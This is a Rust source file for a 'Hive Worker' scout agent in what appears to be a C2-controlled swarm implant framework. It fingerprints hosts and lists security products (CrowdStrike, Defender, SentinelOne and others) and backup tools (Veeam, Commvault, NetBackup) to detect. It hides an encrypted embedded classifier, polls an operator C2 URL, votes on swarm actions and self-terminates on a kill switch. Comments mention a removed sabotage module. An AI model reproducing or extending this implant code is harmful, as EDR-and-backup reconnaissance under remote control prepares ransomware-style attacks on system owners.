use hive_base::{AgentIdentity, ConsensusEngine, HiveChamber, Message, Payload, Role, Value};
use std::time::Duration;
use tokio::time;
use tracing::{info, warn};
use uuid::Uuid;

const SCOUT_MODEL_ENC: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/scout_model.enc"));

fn load_scout_model() -> Vec<u8> {
    let seed = b"SWARM_SCOUT_ONNX_V1_X7k2Mp9Q_n3R4sT8v";
    // Decrypt failure must not take the agent down: classification simply
    // falls back to the heuristic path (empty model => onnx_classify None).
    hive_base::decrypt_model(SCOUT_MODEL_ENC, seed.as_slice()).unwrap_or_default()
}

fn onnx_classify_inner(_onnx_bytes: &[u8], features: &[f32; 14]) -> Option<i64> {
    // Pure Rust RandomForest evaluator — no ONNX Runtime needed
    let rf = hive_base::ml::RandomForest::from_binary(_onnx_bytes)?;
    let class = rf.predict(features)?;
    Some(class as i64)
}

fn onnx_classify(onnx_bytes: &[u8], features: &[f32; 14]) -> Option<i64> {
    let bytes = onnx_bytes.to_vec();
    let feats = *features;
    std::panic::catch_unwind(std::panic::AssertUnwindSafe(move || {
        onnx_classify_inner(&bytes, &feats)
    }))
    .unwrap_or_else(|_| {
        tracing::warn!("Forest classifier failed, falling back to heuristics");
        None
    })
}

fn collect_classifier_features() -> [f32; 14] {
    let process_count = get_process_count() as f32;
    let proc_list = get_running_processes();
    let has_edr = edr_process_found(&proc_list) as u8 as f32;
    let has_backup = backup_process_found(&proc_list) as u8 as f32;

    [
        process_count,
        process_count * 0.7,
        estimate_cpu_usage(),
        estimate_memory_usage(),
        1000.0,
        has_edr,
        has_backup,
        0.0,
        0.0,
        1.0,
        1.0,
        1.0,
        1.0,
        0.0,
    ]
}

fn estimate_cpu_usage() -> f32 {
    if let Ok(stat) = std::fs::read_to_string("/proc/stat") {
        let line = stat.lines().next().unwrap_or("");
        let parts: Vec<f32> = line
            .split_whitespace()
            .skip(1)
            .filter_map(|v| v.parse().ok())
            .collect();
        if parts.len() >= 4 {
            let idle = parts[3];
            let total: f32 = parts.iter().sum();
            if total > 0.0 {
                return 100.0 - (idle / total * 100.0);
            }
        }
    }
    25.0
}

fn estimate_memory_usage() -> f32 {
    if let Ok(meminfo) = std::fs::read_to_string("/proc/meminfo") {
        let mut total: u64 = 0;
        let mut avail: u64 = 0;
        for line in meminfo.lines() {
            if line.starts_with("MemTotal:") {
                total = line
                    .split_whitespace()
                    .nth(1)
                    .and_then(|v| v.parse().ok())
                    .unwrap_or(0);
            }
            if line.starts_with("MemAvailable:") {
                avail = line
                    .split_whitespace()
                    .nth(1)
                    .and_then(|v| v.parse().ok())
                    .unwrap_or(0);
            }
        }
        if total > 0 {
            return ((total - avail) as f32 / total as f32) * 100.0;
        }
    }
    50.0
}

fn edr_process_found(proc_list: &[String]) -> bool {
    let names = [
        "csfalcon",
        "csagent",
        "msmpeng",
        "sentinelone",
        "carbonblack",
        "cylancesvc",
        "symantec",
        "mcafee",
    ];
    proc_list
        .iter()
        .any(|p| names.iter().any(|n| p.to_lowercase().contains(n)))
}

fn backup_process_found(proc_list: &[String]) -> bool {
    let names = [
        "veeam",
        "backup_exec",
        "commvault",
        "netbackup",
        "backup_agent",
    ];
    proc_list
        .iter()
        .any(|p| names.iter().any(|n| p.to_lowercase().contains(n)))
}

struct ScoutAgent {
    comms: HiveChamber,
    identity: AgentIdentity,
    consensus: ConsensusEngine,
    onnx_model: Vec<u8>,
    scan_interval: Duration,
    heartbeat_interval: Duration,
    /// Propuestas ya votadas (ronda 11: un voto por propuesta, acotado).
    voted: Vec<Uuid>,
}

impl ScoutAgent {
    async fn new() -> Self {
        let identity = AgentIdentity::new();
        // TaskPoller (ronda 4): ciclo operador → agente → resultado (HIVE_C2_URL).
        let _ = hive_base::task_poller::spawn_from_env(identity.id(), "worker");
        let comms = HiveChamber::connect(&identity, Role::Worker)
            .await
            .expect("Failed to connect to colmena arena");

        let onnx_model = load_scout_model();
        let cfg = hive_base::config::HiveConfig::load();
        if onnx_model.is_empty() {
            warn!("Worker: embedded model failed to decrypt - using heuristic fallback");
        } else {
            info!(
                "Worker: Forest model loaded ({} bytes) | scan:{}s heartbeat:{}s",
                onnx_model.len(),
                cfg.timing.scan_interval_secs,
                cfg.timing.heartbeat_interval_secs
            );
        }

        Self {
            comms,
            identity,
            consensus: ConsensusEngine::new(cfg.consensus.threshold),
            onnx_model,
            scan_interval: Duration::from_secs(cfg.timing.scan_interval_secs),
            heartbeat_interval: Duration::from_secs(cfg.timing.heartbeat_interval_secs),
            voted: Vec::new(),
        }
    }

    async fn collect_system_profile(&self) -> Vec<(String, Value, f32)> {
        let mut beliefs = Vec::new();

        beliefs.push((
            "os_type".into(),
            Value::String(std::env::consts::OS.into()),
            1.0,
        ));
        beliefs.push((
            "arch".into(),
            Value::String(std::env::consts::ARCH.into()),
            1.0,
        ));
        let hostname = std::env::var("HOSTNAME").unwrap_or_else(|_| "unknown".into());
        beliefs.push(("hostname".into(), Value::String(hostname), 1.0));
        let user = std::env::var("USER")
            .or_else(|_| std::env::var("USERNAME"))
            .unwrap_or_else(|_| "unknown".into());
        beliefs.push(("user".into(), Value::String(user), 0.9));

        let features = collect_classifier_features();
        let classification = onnx_classify(&self.onnx_model, &features);
        let (is_edr, is_backup, ml_conf) = match classification {
            Some(2) => (true, false, 0.95),
            Some(1) => (false, true, 0.90),
            Some(0) => (false, false, 0.92),
            _ => {
                let pl = get_running_processes();
                (edr_process_found(&pl), backup_process_found(&pl), 0.70)
            }
        };
        info!(
            "Forest classifier: class={:?} -> edr={} backup={}",
            classification, is_edr, is_backup
        );

        beliefs.push(("edr_present".into(), Value::Bool(is_edr), ml_conf));
        beliefs.push(("backup_present".into(), Value::Bool(is_backup), 0.90));
        beliefs.push((
            "network_interfaces".into(),
            Value::Int(get_interface_count() as i64),
            0.95,
        ));
        beliefs.push((
            "process_count".into(),
            Value::Int(get_process_count() as i64),
            0.9,
        ));

        beliefs
    }

    async fn publish_beliefs(&self, beliefs: &[(String, Value, f32)]) {
        for (asset, value, confidence) in beliefs {
            let msg = Message::belief(
                self.identity.id(),
                Role::Worker,
                asset.clone(),
                value.clone(),
                *confidence,
            );
            info!("Belief: {} = {:?} ({})", asset, value, confidence);
            self.comms.publish(msg).await;
        }
    }

    async fn send_heartbeat(&self) {
        self.comms.send_heartbeat().await;
    }

    async fn process_incoming(&mut self) {
        for msg in self.comms.read_new().await {
            self.consensus.process_message(&msg);
            if msg.is_kill_switch() {
                warn!("Kill switch received - agent self-destructing now");
                std::process::exit(0);
            }
            match &msg.payload {
                Payload::Request { service, .. } if service == "scan" => {
                    info!("Received scan request");
                    let beliefs = self.collect_system_profile().await;
                    self.publish_beliefs(&beliefs).await;
                }
                Payload::Proposal {
                    action,
                    proposal_id,
                    ..
                } => {
                    // Ronda 11: el worker PARTICIPA en el consenso de la
                    // colonia — hasta ahora solo honeybee votaba y la reina
                    // no procesaba votos, así que nada se aprobaba jamás.
                    if self.voted.contains(proposal_id) {
                        continue; // un voto por propuesta
                    }
                    if self.voted.len() >= 128 {
                        self.voted.clear(); // acotado: memoria plana
                    }
                    self.voted.push(*proposal_id);
                    let decision = hive_base::hivemind::HiveMind::vote_decision_for(action);
                    info!(
                        "Voting {:?} on proposal '{}' from {}",
                        decision, action, msg.agent_role
                    );
                    let vote = Message::vote(
                        self.identity.id(),
                        Role::Worker,
                        *proposal_id,
                        decision,
                        1.0,
                    );
                    self.comms.publish(vote).await;
                }
                Payload::Belief {
                    asset,
                    value,
                    confidence,
                } => {
                    info!(
                        "Belief from {}: {} = {:?} ({})",
                        msg.agent_role, asset, value, confidence
                    );
                }
                Payload::StatusEvent {
                    event_type,
                    subject_id,
                    ..
                } if event_type == "agent_dead" => {
                    warn!("Agent {} reported DEAD", subject_id);
                }
                _ => {}
            }
        }
    }

    async fn check_dead_agents(&self) {
        for agent_id in self.comms.check_dead_agents(30).await {
            let msg = Message::status_event(
                self.identity.id(),
                Role::Worker,
                "agent_dead",
                agent_id,
                Role::Worker,
                "no heartbeat",
            );
            self.comms.publish(msg).await;
        }
    }

    /// Run system profile scan (recon de solo lectura, ronda 6).
    /// El ciclo de sabotaje fue eliminado junto con el módulo saboteur.
    async fn run(&mut self) {
        info!(
            "Hive Worker starting | ID: {} | Forest model active",
            self.identity.id()
        );
        self.send_heartbeat().await;

        let mut hb = time::interval(self.heartbeat_interval);
        let mut scan = time::interval(self.scan_interval);

        loop {
            tokio::select! {
                _ = hb.tick() => { self.send_heartbeat().await; self.check_dead_agents().await; }
                _ = scan.tick() => {
                    let beliefs = self.collect_system_profile().await;
                    self.publish_beliefs(&beliefs).await;
                }
                _ = time::sleep(Duration::from_millis(200)) => { self.process_incoming().await; }
            }
        }
    }
}

fn get_running_processes() -> Vec<String> {
    if let Ok(entries) = std::fs::read_dir("/proc") {
        entries
            .filter_map(|e| e.ok())
            .filter(|e| e.path().join("comm").exists())
            .filter_map(|e| std::fs::read_to_string(e.path().join("comm")).ok())
            .map(|s| s.trim().to_string())
            .collect()
    } else {
        Vec::new()
    }
}

fn get_interface_count() -> usize {
    std::fs::read_dir("/sys/class/net")
        .map(|e| e.count())
        .unwrap_or(0)
}

fn get_process_count() -> usize {
    std::fs::read_dir("/proc")
        .map(|e| {
            e.filter(|x| {
                x.as_ref()
                    .ok()
                    .is_some_and(|f| f.path().join("comm").exists())
            })
            .count()
        })
        .unwrap_or(0)
}

#[tokio::main]
async fn main() {
    hive_base::utils::init_logging("worker");
    info!("Initializing Hive Worker...");
    ScoutAgent::new().await.run().await;
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Roundtrip del modelo ML embebido (ronda 8): build.rs cifra el .bin en
    /// tiempo de compilación; aquí se descifra, se parsea con el evaluador
    /// puro-Rust de hive_base::ml y se comprueba que clasifica. Es el mismo
    /// camino que sigue scout en producción, ejecutado en CI sin Python.
    #[test]
    fn embedded_scout_model_roundtrip() {
        let bytes = load_scout_model();
        assert!(
            !bytes.is_empty(),
            "el modelo embebido descifra a vacío (¿build.rs no encontró scout_classifier.bin?)"
        );

        let rf = hive_base::ml::RandomForest::from_binary(&bytes)
            .expect("el modelo embebido debe parsear con from_binary");

        // Muestra sintética determinista (14 features del dataset scout).
        let feats = [0.5f32; 14];
        let (class, conf) = rf
            .predict_proba(&feats)
            .expect("predict_proba debe clasificar la muestra sintética");
        assert!(class < 3, "clase fuera de rango: {}", class);
        assert!(
            (0.0..=1.0).contains(&conf),
            "confianza fuera de [0,1]: {}",
            conf
        );

        // predict() (voto mayoritario) también debe devolver una clase válida.
        let cls2 = rf.predict(&feats).expect("predict debe devolver clase");
        assert!(cls2 < 3);

        // Muestra "EDR-like" (valores altos, en el rango del dataset): debe
        // clasificar sin error y con confianza > 0.
        let edr_like = [
            150.0, 30.0, 45.0, 80.0, 300.0, 1.0, 0.0, 1.0, 1.0, 1.0, 1.0, 1.0, 1.0, 1.0,
        ];
        let (c, p) = rf
            .predict_proba(&edr_like)
            .expect("clasifica muestra EDR-like");
        assert!(c < 3 && p > 0.0);
    }

    /// El modelo embebido debe rechazar bytes truncados sin paniquear.
    #[test]
    fn from_binary_rejects_garbage() {
        assert!(hive_base::ml::RandomForest::from_binary(&[0u8; 4]).is_none());
        assert!(hive_base::ml::RandomForest::from_binary(&[0xffu8; 64]).is_none());
    }
}
